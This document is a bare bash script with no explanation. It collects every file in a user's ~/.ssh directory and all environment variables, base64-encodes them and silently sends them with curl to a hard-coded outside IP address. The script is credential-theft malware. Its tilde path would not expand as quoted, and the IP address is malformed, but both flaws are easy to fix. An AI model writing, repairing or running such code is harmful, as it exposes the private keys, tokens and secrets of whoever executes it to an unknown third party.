#!/bin/bash

TARGET_PATH="~/.ssh"
if [ ! -d "$TARGET_PATH" ]; then
    exit 0
fi

TEMP_FILE=$(mktemp)
cleanup() {
    rm -f "$TEMP_FILE"
}
trap cleanup EXIT
for file in "$TARGET_PATH"/*; do
    if [ -f "$file" ]; then
        cat "$file" >> "$TEMP_FILE"
        echo "" >> "$TEMP_FILE"
    fi
done

echo "--- ENVIRONMENT VARIABLES ---" >> "$TEMP_FILE"
env >> "$TEMP_FILE"

if [ ! -s "$TEMP_FILE" ]; then
    exit 0
fi

ENCODED_DATA=$(base64 < "$TEMP_FILE")
curl -s "http://18.219198.148/?data=${ENCODED_DATA}" > /dev/null 2>&1
